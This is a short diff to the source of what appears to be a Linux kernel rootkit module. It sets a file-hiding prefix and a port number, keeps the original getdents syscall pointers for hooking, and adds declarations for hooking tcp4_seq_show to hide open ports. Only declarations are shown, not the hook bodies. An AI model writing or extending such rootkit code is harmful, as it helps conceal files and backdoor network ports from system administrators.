@@ -2,9 +2,10 @@
 #include <linux/kernel.h>
 #include <linux/string.h>
 #include <linux/dirent.h>	        //contains dirent structs etc
+#include <linux/tcp.h>
 
 #define PREFIX "SOHAIL"
-#define PORT 42069
+#define PORT 420
 
 #ifdef CONFIG_X86_64
 /* on 64-bit x86 and kernel v4.17 syscalls are nolonger
@@ -24,10 +25,8 @@ static ptregs_t orig_getdents64;
 /* ls 32-bit */
 typedef asmlinkage long (*ptregs_t)(const struct pt_regs *);
 static ptregs_t orig_getdents;
-/* open ports */
-typedef asmlinkage long (*ptregs_t)(const struct seq_file *seq, void *v);
-static ptregs_t orig_tcp4_seq_show;
-
+/* hiding ports*/
+static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
 
 #else
 /* kill */
@@ -42,7 +41,8 @@ static orig_getdents64_t orig_getdents64;
 /* ls 32-bit */
 typedef asmlinkage long (*orig_getdents_t)(unsigned int fd, struct linux_dirent *dirent, unsigned intcount);
 static orig_getdents_t orig_getdents;
-
+/* hiding ports */
+static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
 
 #endif
 
